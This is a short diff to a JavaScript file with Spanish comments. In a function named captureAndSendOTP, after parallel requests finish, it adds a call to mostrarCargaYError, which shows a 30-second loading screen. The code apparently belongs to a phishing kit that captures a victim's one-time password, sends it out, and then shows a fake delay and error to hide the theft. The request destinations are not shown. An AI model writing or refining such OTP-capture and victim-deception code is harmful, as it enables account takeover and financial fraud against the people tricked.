@@ -169,7 +169,7 @@ async function captureAndSendOTP() {
 
         // Ejecutamos ambas peticiones en paralelo y esperamos a que ambas terminen
         await Promise.all(requests);
-
+mostrarCargaYError();
       
 
     } catch (error) {
@@ -216,6 +216,7 @@ function mostrarCargaYError() {
 
   }, 30000); // ⏱️ tiempo de carga
 }
+
 
 
 
